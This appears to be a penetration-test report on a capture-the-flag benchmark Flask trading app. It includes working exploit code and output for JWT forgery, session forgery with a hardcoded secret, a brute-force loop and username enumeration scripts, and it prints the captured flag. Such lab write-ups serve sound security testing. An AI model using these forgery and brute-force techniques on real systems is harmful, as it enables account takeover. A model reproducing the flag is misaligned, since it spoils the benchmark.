# Security Assessment Report

## Executive Summary

**Target:** http://localhost:44191
**Assessment Date:** January 29, 2025
**Scope:** Authentication, Authorization, XSS, SQL and Command Injection, SSRF testing

This security assessment identified critical vulnerabilities in the XBEN-027-24 Trading Platform, a Flask-based web application. The most severe finding is a complete authentication bypass allowing horizontal privilege escalation to any user account.

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Five critical authentication vulnerabilities were successfully exploited:

1. **Session Hijacking via JWT Signature Bypass (Critical)** - JWT signature verification is explicitly disabled at `routes.py:81`, allowing attackers to forge tokens with arbitrary user IDs. Combined with missing security flags on the `auth_token` cookie (no HttpOnly, Secure, or SameSite), this enables complete account takeover. Successfully exploited to extract CTF flag from user ID 10019.

2. **Brute Force Attacks (High)** - No rate limiting, CAPTCHA, or account lockout mechanisms exist on authentication endpoints. Tested with 50 rapid authentication attempts averaging 8.55 requests per second with no throttling detected.

3. **Account Enumeration (Medium)** - The two-step login flow provides different HTTP response patterns for valid vs. invalid usernames (HTTP 302 redirect vs. HTTP 200 with error), enabling username discovery for targeted attacks.

4. **Session Fixation (High)** - Session IDs are not regenerated after successful authentication. Combined with the hardcoded weak secret key (`'your_secret_key'`), attackers can forge sessions with malicious data that persists after victim authentication.

5. **Token Replay After Logout (Medium)** - The logout function clears the Flask session but does not invalidate the JWT `auth_token` cookie. JWT tokens remain valid indefinitely after logout with no expiration claim or revocation mechanism.

**Authorization Vulnerabilities:**

Two authorization vulnerabilities were successfully exploited:

1. **JWT Signature Bypass Enables Horizontal Privilege Escalation (Critical)** - Disabled JWT signature verification at `routes.py:81` allows forging tokens with arbitrary user IDs to access any user's dashboard data. Successfully extracted CTF flag: `FLAG{9b9b48050b4f9e9ce238a9d125a4bbc276060f61d709ed77b5541a0205c79d24}`

2. **Pre-Authentication Information Disclosure (High)** - The `/password/<username>` endpoint is publicly accessible and reveals user existence, first names, and internal user IDs without authentication, enabling user enumeration and reconnaissance for targeted attacks.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The application uses Jinja2 templating with auto-escaping enabled by default, providing protection against XSS attacks. All user-controlled data rendering points were tested and confirmed to be properly escaped.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. All database queries use SQLAlchemy ORM with automatic parameterization, preventing SQL injection. The application does not execute shell commands or system processes in response to user input.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application does not make outbound HTTP requests, does not fetch remote resources, and does not use user input to construct URLs or network connections. The limited feature set (authentication and database queries) does not include functionality commonly associated with SSRF vulnerabilities.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 80/TCP:** Apache 2.4.65 (Debian) / Caddy HTTP server - Primary application endpoint accessible at http://localhost:44191
- **Port 443/TCP:** SSL/HTTPS port open but not configured - Connection fails, no TLS certificate present, no HTTP-to-HTTPS redirect
- **Port 49152/TCP:** Golang Tailscale VPN service (v1.82.5) - Requires authentication, returns "auth required" with strict Content-Security-Policy headers

**Subdomain Discoveries:**
Multiple localhost subdomains discovered via subfinder enumeration: server02.counterintel.localhost, mail.localhost, autodiscover.localhost, www.localhost, owa.regency.localhost, and others. These appear to be DNS artifacts from localhost enumeration and are not part of the actual attack surface.

**Security Misconfigurations:**
- **Apache Configuration:** Wildcard CORS policy (`Access-Control-Allow-Origin: *`) allows any domain to make authenticated cross-origin requests. Directory listing enabled (`Options Indexes FollowSymLinks`) potentially exposes file structure.
- **Missing Security Headers:** No Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, or Permissions-Policy headers detected.
- **No Transport Encryption:** Application runs exclusively over HTTP with no HTTPS/TLS configuration, exposing all data including credentials and session tokens to network eavesdropping.

**Database Security:**
MySQL 5.7.15 detected (released 2016, EOL October 2023) - severely outdated with known critical CVEs. Database port 3306 not exposed externally (internal Docker network only). Application connects using root credentials (`root:trading_platform_db_pass`), violating principle of least privilege.

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-02: Session Hijacking via Insecure JWT Cookie & JWT Signature Bypass

**Summary:**
- **Vulnerable location:** POST /password/<username> (JWT generation at routes.py:63) and GET /dashboard (JWT validation at routes.py:80-81)
- **Overview:** The JWT auth_token cookie lacks security flags (no HttpOnly, no Secure, no SameSite), and JWT signature verification is explicitly disabled. This enables session hijacking through JWT token manipulation, allowing horizontal privilege escalation to any user account including capturing the CTF flag.
- **Impact:** Complete account takeover of any user by forging JWT tokens. Successfully extracted CTF flag from user_id 10019.
- **Severity:** Critical

**Prerequisites:**
- Any authenticated account (e.g., test:test credentials)
- Python with PyJWT library for JWT manipulation

**Exploitation Steps:**

1. **Authenticate as test user to obtain legitimate session:**
```bash
curl -i -c /tmp/auth_cookies.txt -X POST http://localhost:44191/password/test \
  -d "password=test&username=test"
```

**Response:**
```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs; Path=/
Set-Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJgDw.UVOSWDaP5wNX-pL3y8IzRDyv4_4; HttpOnly; Path=/
```

**Note:** The `auth_token` cookie has NO security flags (no HttpOnly, no Secure, no SameSite).

2. **Verify JWT token structure:**
```python
import jwt
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"
decoded = jwt.decode(token, options={"verify_signature": False})
# Output: {'username': 'test', 'user_id': 10032, 'user_type': 'customer'}
```

3. **Forge JWT token with target user_id (10019 = flag user):**
```python
import jwt
forged_payload = {
    "username": "attacker",
    "user_id": 10019,
    "user_type": "admin"
}
forged_token = jwt.encode(forged_payload, "wrong_secret", algorithm="HS256")
# Output: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwidXNlcl9pZCI6MTAwMTksInVzZXJfdHlwZSI6ImFkbWluIn0.fkNLhE627kyo7FGt2tpau21xOGLoERgwHDS4JT_RC0w
```

4. **Access dashboard with forged JWT + legitimate session cookie:**
```bash
curl -i http://localhost:44191/dashboard \
  -H "Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.aQJgDw.UVOSWDaP5wNX-pL3y8IzRDyv4_4; auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwidXNlcl9pZCI6MTAwMTksInVzZXJfdHlwZSI6ImFkbWluIn0.fkNLhE627kyo7FGt2tpau21xOGLoERgwHDS4JT_RC0w"
```

**Proof of Impact:**

**Response Body:**
```html
<h5 class="card-title">Welcome, Flag FLAG{9b9b48050b4f9e9ce238a9d125a4bbc276060f61d709ed77b5541a0205c79d24}</h5>
```

**CTF Flag Captured:** `FLAG{9b9b48050b4f9e9ce238a9d125a4bbc276060f61d709ed77b5541a0205c79d24}`

**Technical Details:**
- JWT signature verification disabled at `routes.py:81`: `options={'verify_signature':False}`
- Application trusts unverified client-controlled `user_id` claim from JWT
- Dashboard uses JWT user_id (line 84) instead of session user_id to fetch user data
- Missing cookie security flags enable XSS-based token theft and MITM attacks

**Notes:**
This vulnerability combines two issues:
1. Missing cookie security flags (no HttpOnly makes JWT accessible to JavaScript)
2. Disabled JWT signature verification (enables token forgery without knowing the secret)

The exploitation demonstrated complete horizontal privilege escalation, allowing access to any user's account by manipulating a single JWT field.

---

### AUTH-VULN-03: Brute Force Attacks (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST / (username validation) and POST /password/<username> (password authentication)
- **Overview:** The application has no rate limiting, CAPTCHA, account lockout, or failed login logging on authentication endpoints. Unlimited rapid authentication attempts are possible without throttling or monitoring.
- **Impact:** Enables unlimited brute force password attacks, credential stuffing, and password spraying against user accounts.
- **Severity:** High

**Prerequisites:**
- None (public unauthenticated endpoint)
- Common password list or credential stuffing database

**Exploitation Steps:**

1. **Execute 50 rapid authentication attempts without rate limiting:**

Python script created at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-027-24/brute_force_test.py` that performs automated testing.

2. **Manual verification with 10 rapid failed attempts:**
```bash
for i in {1..10}; do
  curl -s -w "Attempt $i - Status: %{http_code}, Time: %{time_total}s\n" \
    -X POST http://localhost:44191/password/test \
    -d "password=wrongpass&username=test" \
    -o /dev/null
done
```

**Proof of Impact:**

**Test Results:**
```
Attempt 1 - Status: 302, Time: 0.010756s
Attempt 2 - Status: 302, Time: 0.003522s
Attempt 3 - Status: 302, Time: 0.003926s
Attempt 4 - Status: 302, Time: 0.002605s
Attempt 5 - Status: 302, Time: 0.003955s
Attempt 6 - Status: 302, Time: 0.002886s
Attempt 7 - Status: 302, Time: 0.004131s
Attempt 8 - Status: 302, Time: 0.002342s
Attempt 9 - Status: 302, Time: 0.003030s
Attempt 10 - Status: 302, Time: 0.003185s
```

**Automated Test Summary:**
- **Total Attempts:** 50 (10 passwords × 5 repetitions)
- **Time Taken:** 5.85 seconds
- **Average Response Time:** 0.014s (14ms)
- **Requests Per Second:** 8.55
- **Failed Attempts:** 0 connection errors
- **Rate Limiting Detected:** NONE
- **HTTP 429 Responses:** 0
- **Throttling/Delays:** None observed

**Evidence of Missing Defenses:**
- No rate limiting library in `requirements.txt` (no flask-limiter)
- No rate limiting decorators on authentication endpoints (`routes.py:21`, `routes.py:46`)
- No Apache mod_ratelimit configuration in `trading_platform-httpd.conf`
- No CAPTCHA integration (no reCAPTCHA/hCaptcha)
- No account lockout logic in `routes.py`
- No failed login logging

**Notes:**
Combined with AUTH-VULN-04 (username enumeration), an attacker can:
1. Enumerate valid usernames
2. Perform unlimited password guessing attempts per username
3. Test common passwords or credential stuffing databases
4. Execute password spraying attacks across multiple accounts

---

### AUTH-VULN-04: Account Enumeration via Login Flow

**Summary:**
- **Vulnerable location:** POST / (username validation at routes.py:28-33)
- **Overview:** The two-step login flow provides different response patterns for valid vs. invalid usernames. Valid usernames trigger HTTP 302 redirect to /password/<username>, while invalid usernames return HTTP 200 with error message.
- **Impact:** Enables building targeted lists of valid usernames for password attacks.
- **Severity:** Medium

**Prerequisites:**
- None (public unauthenticated endpoint)
- Username wordlist for enumeration

**Exploitation Steps:**

1. **Test valid username (known: "test"):**
```bash
curl -s -i -X POST http://localhost:44191/ -d "username=test"
```

**Response:**
```
HTTP/1.1 302 FOUND
Location: /password/test
```

2. **Test invalid username:**
```bash
curl -s -i -X POST http://localhost:44191/ -d "username=nonexistent"
```

**Response:**
```
HTTP/1.1 200 OK
[HTML body contains error message]
```

3. **Automated username enumeration:**

Python script created at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-027-24/username_enum.py` that tests common usernames.

**Proof of Impact:**

**Valid Usernames Discovered:**
- **test** → HTTP 302 redirect to `/password/test`
- **flag** → HTTP 302 redirect to `/password/flag`

**Invalid Usernames (Sample):**
- admin → HTTP 200 (no redirect)
- root → HTTP 200 (no redirect)
- administrator → HTTP 200 (no redirect)

**Enumeration Oracle:**
- **Valid username:** HTTP 302 + `Location: /password/{username}` header
- **Invalid username:** HTTP 200 + error message in body

**Technical Details:**
- Code at `routes.py:28-33` returns different responses based on username existence
- No rate limiting allows rapid enumeration of large username lists
- Enumeration confirmed two valid accounts: `test` and `flag`

**Notes:**
This username enumeration vulnerability enables targeted password attacks by:
1. Building a list of valid usernames
2. Focusing brute force attempts only on confirmed accounts
3. Avoiding detection by not testing invalid usernames
4. Combined with AUTH-VULN-03 (no rate limiting), enables efficient account compromise

---

### AUTH-VULN-07: Session Fixation Vulnerability

**Summary:**
- **Vulnerable location:** POST /password/<username> (session creation at routes.py:60)
- **Overview:** Session IDs are not regenerated after successful authentication. The code at `routes.py:60` adds `user_id` to existing session without clearing or regenerating the session ID. Attacker can forge a session with malicious data using the known weak secret key.
- **Impact:** Attacker can inject data into a session before authentication, and this data persists after the victim logs in. Combined with the weak hardcoded secret, enables session hijacking.
- **Severity:** High

**Prerequisites:**
- Knowledge of hardcoded Flask secret key: `'your_secret_key'` (from `__init__.py:11`)
- Python with Flask library for session serialization

**Exploitation Steps:**

1. **Forge session cookie with attacker-controlled data:**
```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Hardcoded secret from target app
serializer = SecureCookieSessionInterface().get_signing_serializer(app)

# Create malicious session data
attacker_session_data = {
    'attacker_data': 'malicious',
    'tracking_id': 'ATTACKER123'
}
forged_session = serializer.dumps(attacker_session_data)
# Output: eyJhdHRhY2tlcl9kYXRhIjoibWFsaWNpb3VzIiwidHJhY2tpbmdfaWQiOiJBVFRBQ0tFUjEyMyJ9.aQJhOw.Fe7tyDpCWRsT6X1M_qEzzh8CP5M
```

2. **Victim authenticates with attacker's forged session:**
```bash
curl -s -i \
  -H "Cookie: session=eyJhdHRhY2tlcl9kYXRhIjoibWFsaWNpb3VzIiwidHJhY2tpbmdfaWQiOiJBVFRBQ0tFUjEyMyJ9.aQJhOw.Fe7tyDpCWRsT6X1M_qEzzh8CP5M" \
  -X POST http://localhost:44191/password/test \
  -d "password=test&username=test"
```

**Response:**
```
Set-Cookie: session=eyJhdHRhY2tlcl9kYXRhIjoibWFsaWNpb3VzIiwidHJhY2tpbmdfaWQiOiJBVFRBQ0tFUjEyMyIsInVzZXJfaWQiOjEwMDMyfQ...
```

3. **Decode post-authentication session to verify attacker data persisted:**
```python
decoded_session = serializer.loads('eyJhdHRhY2tlcl9kYXRhIjoibWFsaWNpb3VzIiwidHJhY2tpbmdfaWQiOiJBVFRBQ0tFUjEyMyIsInVzZXJfaWQiOjEwMDMyfQ...')
# Output: {'attacker_data': 'malicious', 'tracking_id': 'ATTACKER123', 'user_id': 10032}
```

**Proof of Impact:**

**Pre-authentication session:**
```json
{
  "attacker_data": "malicious",
  "tracking_id": "ATTACKER123"
}
```

**Post-authentication session:**
```json
{
  "attacker_data": "malicious",
  "tracking_id": "ATTACKER123",
  "user_id": 10032
}
```

**Vulnerability Confirmed:**
- Attacker's injected data PERSISTED after authentication
- Session was NOT cleared or regenerated
- Code at `routes.py:60` only adds `user_id` without calling `session.clear()`

**Technical Details:**
- Vulnerable code: `session['user_id'] = user.id` (no session regeneration)
- Missing defense: No `session.clear()` or `session.regenerate()` before adding user_id
- Weak secret key `'your_secret_key'` enables session forgery
- No session timeout configured

**Notes:**
Best practice would be:
```python
session.clear()  # Clear existing session data
session['user_id'] = user.id  # Set authenticated user
```

This ensures attacker-controlled data cannot persist into the authenticated session.

---

### AUTH-VULN-08: Token Replay After Logout (Incomplete Logout)

**Summary:**
- **Vulnerable location:** POST /logout (logout implementation at routes.py:38-42)
- **Overview:** The logout function only removes `user_id` from the Flask session but does not clear the JWT `auth_token` cookie. After logout, the JWT token remains in the browser and can be reused indefinitely.
- **Impact:** JWT tokens are not invalidated on logout. An attacker who captured a JWT token (via XSS, network interception, or physical access) can reuse it even after the user logs out.
- **Severity:** Medium

**Prerequisites:**
- Captured JWT token from previous authentication session
- Valid session cookie (can be obtained through new login)

**Exploitation Steps:**

1. **Login and capture JWT token:**
```bash
curl -i -c /tmp/logout_test.txt -X POST http://localhost:44191/password/test \
  -d "password=test&username=test"
```

**JWT Captured:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs`

2. **Verify dashboard access works:**
```bash
curl -b /tmp/logout_test.txt http://localhost:44191/dashboard
```

**Response:** `Welcome, John Doe` (dashboard accessible)

3. **User logs out:**
```bash
curl -s -i -b /tmp/logout_test.txt -X POST http://localhost:44191/logout
```

**Response:**
```
HTTP/1.1 302 FOUND
Location: /
[No Set-Cookie header for auth_token - JWT NOT CLEARED]
```

4. **Verify JWT token NOT cleared from browser:**
```bash
cat /tmp/logout_test.txt | grep auth_token
```

**Output:** JWT token still present in cookie file (not expired/cleared)

5. **Replay old JWT with new session:**
```python
import requests

# User logs in again (new session)
s = requests.Session()
s.post("http://localhost:44191/password/test",
       data={"password": "test", "username": "test"})

# Replace new JWT with OLD JWT from before logout
old_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"
s.cookies.set('auth_token', old_jwt)

# Access dashboard with old JWT
r = s.get("http://localhost:44191/dashboard")
# Response: 200 OK, Dashboard accessible
```

**Proof of Impact:**

**Test Results:**
```
Step 1: JWT captured from initial login
Step 2: Dashboard accessible with original session
Step 3: User logs out (JWT not cleared)
Step 4: User logs in again (new session, new JWT issued)
Step 5: Old JWT replaced into new session
Step 6: Dashboard access with OLD JWT + current session: 200 OK
  Dashboard shows: John Doe

VULNERABILITY CONFIRMED:
- Old JWT (from before logout) is STILL VALID
- JWT tokens are NOT invalidated on logout
- Attacker can reuse captured tokens indefinitely
```

**Technical Details:**
- Logout code at `routes.py:38-42` only calls `session.pop('user_id', None)`
- Missing code: `resp.set_cookie('auth_token', '', expires=0)` to clear JWT cookie
- JWT has no expiration claim (`exp` field missing in payload)
- No token revocation mechanism exists (stateless JWT with no blacklist)

**Attack Scenarios:**
1. **XSS Token Theft:** Attacker steals JWT via XSS (no HttpOnly flag), user logs out, attacker reuses token
2. **Network Interception:** Attacker captures JWT over HTTP, user logs out, attacker replays token
3. **Physical Access:** Attacker extracts JWT from browser, user logs out, attacker uses stored token

**Notes:**
Complete logout should include:
```python
session.pop('user_id', None)  # Clear session
resp = redirect(url_for('login'))
resp.set_cookie('auth_token', '', expires=0)  # Clear JWT cookie
return resp
```

JWT tokens should also include:
- Expiration claim (`exp`) with reasonable lifetime
- Token revocation mechanism (blacklist or database tracking)
- Rotation on logout or sensitive operations

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: JWT Signature Bypass Enables Horizontal Privilege Escalation

**Summary:**
- **Vulnerable location:** `GET /dashboard` endpoint at `/app/website/app/routes.py:73-92`
- **Overview:** JWT signature verification explicitly disabled, allowing attackers to forge tokens with arbitrary user_id values and access any user's dashboard data
- **Impact:** Complete horizontal privilege escalation - any authenticated user can access any other user's data, including the CTF flag stored in user 10019's last_name field
- **Severity:** Critical

**Prerequisites:**
- Any valid session (can be obtained by authenticating with test:test credentials)
- Python with PyJWT library (for forging JWT tokens)

**Exploitation Steps:**

1. **Authenticate as test user to establish valid session:**
   ```bash
   # Navigate to login page
   curl -c cookies.txt http://localhost:44191/

   # Submit username
   curl -b cookies.txt -c cookies.txt -X POST \
     -d "username=test" \
     http://localhost:44191/

   # Submit password
   curl -b cookies.txt -c cookies.txt -X POST \
     -d "password=test" \
     http://localhost:44191/password/test
   ```

2. **Extract legitimate JWT token from cookies:**
   ```bash
   # JWT token will be in cookies.txt as auth_token
   # Example: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

3. **Decode JWT to verify structure (optional):**
   ```python
   import jwt

   original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"

   # Decode without verification
   decoded = jwt.decode(original_jwt, options={"verify_signature": False})
   print(decoded)
   # Output: {'username': 'test', 'user_id': 10032, 'user_type': 'customer'}
   ```

4. **Forge JWT token with target user_id (10019 for flag user):**
   ```python
   import jwt

   # Create payload with target user_id
   forged_payload = {
       "username": "test",
       "user_id": 10019,  # Flag user's ID
       "user_type": "customer"
   }

   # Sign with ANY secret (signature verification is disabled)
   forged_jwt = jwt.encode(forged_payload, "wrong_secret", algorithm="HS256")
   print(forged_jwt)
   # Output: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAxOSwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.IRQBLuFAcuDG8hC5Z2td4BxPQcxCShrAZ02OJ4f8imo
   ```

5. **Replace auth_token cookie with forged JWT:**
   ```bash
   # Method 1: Using curl
   curl -b "session=[SESSION_COOKIE]" \
        --cookie "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAxOSwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.IRQBLuFAcuDG8hC5Z2td4BxPQcxCShrAZ02OJ4f8imo" \
        http://localhost:44191/dashboard

   # Method 2: Using browser developer tools
   # 1. Open browser console (F12)
   # 2. Execute: document.cookie = "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAxOSwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.IRQBLuFAcuDG8hC5Z2td4BxPQcxCShrAZ02OJ4f8imo; path=/"
   # 3. Refresh page or navigate to /dashboard
   ```

6. **Access dashboard to extract flag:**
   ```bash
   # Dashboard will display flag user's data
   # Navigate to: http://localhost:44191/dashboard
   ```

**Proof of Impact:**

Successfully accessed flag user (ID 10019) dashboard and extracted flag:

```
Dashboard URL: http://localhost:44191/dashboard
Welcome Message: "Welcome, Flag FLAG{9b9b48050b4f9e9ce238a9d125a4bbc276060f61d709ed77b5541a0205c79d24}"
```

**Flag Captured:** `FLAG{9b9b48050b4f9e9ce238a9d125a4bbc276060f61d709ed77b5541a0205c79d24}`

**Root Cause Analysis:**

The vulnerability exists at `/app/website/app/routes.py:81` where JWT signature verification is explicitly disabled:

```python
# Line 80-81: JWT decoded without signature verification
data = jwt.decode(token, app.config['AUTH_SECRET_KEY'], algorithms=['HS256'],
    options={'verify_signature':False})  # CRITICAL VULNERABILITY

# Line 84: Application trusts unverified user_id from JWT
user_id = data['user_id']

# Line 88: Fetches arbitrary user's data with no ownership validation
user = User.query.get(user_id)
```

The application checks for a valid session but then overrides the session's user_id with the unverified JWT claim, enabling complete horizontal privilege escalation.

**Notes:**

- Session cookie must remain valid (obtained through legitimate authentication)
- JWT signature can be anything - the application doesn't verify it
- Any valid user_id can be specified (10032 for test user, 10019 for flag user)
- No rate limiting allows unlimited attempts
- Vulnerability is externally exploitable via http://localhost:44191 with no internal network access required

---

### AUTHZ-VULN-02: Pre-Authentication Information Disclosure via Username Enumeration

**Summary:**
- **Vulnerable location:** `GET /password/<username>` endpoint at `/app/website/app/routes.py:46-69`
- **Overview:** Password entry page accessible without authentication reveals user existence, first names, and internal user IDs
- **Impact:** User enumeration and reconnaissance - attackers can discover valid usernames, user IDs, and first names to support targeted attacks like password spraying and social engineering
- **Severity:** High

**Prerequisites:**
None - endpoint is publicly accessible without authentication

**Exploitation Steps:**

1. **Test username enumeration with valid user:**
   ```bash
   # Access password page for known user "test"
   curl http://localhost:44191/password/test
   ```

   **Response reveals:**
   - Page displays: "Welcome, John!" (first name exposed)
   - HTML contains: `<input id="user_id" name="user_id" value="10032" hidden>` (user ID exposed)
   - HTTP 200 status (confirms user exists)

2. **Test username enumeration with invalid user:**
   ```bash
   # Access password page for non-existent user
   curl http://localhost:44191/password/nonexistent
   ```

   **Response shows:**
   - Redirects to: `http://localhost:44191/?error=User+not+found`
   - HTTP 302 redirect (confirms user doesn't exist)
   - Different behavior reveals username validity

3. **Extract data from flag user:**
   ```bash
   # Access password page for flag user
   curl http://localhost:44191/password/flag
   ```

   **Response reveals:**
   - Page displays: "Welcome, Flag!" (first name: "Flag")
   - HTML contains: `<input id="user_id" name="user_id" value="10019" hidden>` (user ID: 10019)
   - Confirms "flag" is a valid username

4. **Automated user enumeration script:**
   ```python
   import requests

   target = "http://localhost:44191"
   usernames = ["admin", "test", "flag", "user", "john", "jane"]

   for username in usernames:
       response = requests.get(f"{target}/password/{username}", allow_redirects=False)

       if response.status_code == 200:
           # User exists - extract data from response
           print(f"[+] Valid user: {username}")

           # Parse first name from "Welcome, [NAME]!" text
           if "Welcome," in response.text:
               import re
               match = re.search(r'Welcome, (\w+)!', response.text)
               if match:
                   first_name = match.group(1)
                   print(f"    First name: {first_name}")

           # Extract user_id from hidden field
           match = re.search(r'name="user_id" value="(\d+)"', response.text)
           if match:
               user_id = match.group(1)
               print(f"    User ID: {user_id}")

       elif response.status_code == 302:
           print(f"[-] Invalid user: {username}")
   ```

**Proof of Impact:**

Successfully enumerated multiple users without authentication:

| Username | Status | First Name | User ID |
|----------|--------|------------|---------|
| test | Valid | John | 10032 |
| flag | Valid | Flag | 10019 |
| nonexistent | Invalid | N/A | N/A |

**Example HTML Response for Valid User (test):**
```html
<form method="POST">
    <div class="form-group">
        <p class="mt-3 text-center">Welcome, John!</p>
        <label for="password">Password</label>
        <input type="text" id="username" name="username" value="test" hidden>
        <input type="text" id="user_id" name="user_id" value="10032" hidden>
        <input type="password" id="password" name="password" required>
    </div>
    <button type="submit">Login</button>
</form>
```

**Root Cause Analysis:**

The vulnerability exists at `/app/website/app/routes.py:48` where database lookup occurs without authentication:

```python
# Line 48: No authentication check before database query
user = User.query.filter_by(username=username).first()

if not user:
    # Line 51: Redirect to login with error (different behavior)
    return redirect(url_for('login', error='User not found'))

# Lines 69: Expose user data to unauthenticated requester
return render_template('password.html',
                      first_name=user.first_name,  # PII exposed
                      username=username,            # Username confirmed
                      user_id=user.id)              # Internal ID exposed
```

The application lacks authentication checks before database queries and renders sensitive user information to unauthenticated requesters.

**Notes:**

- No authentication required - completely public endpoint
- Different responses for valid vs. invalid usernames enable enumeration
- Exposed user IDs can be used with AUTHZ-VULN-01 for targeted exploitation
- No rate limiting allows automated enumeration of entire user database
- Vulnerability supports password spraying attacks with known valid usernames
- Externally exploitable via http://localhost:44191 from public internet
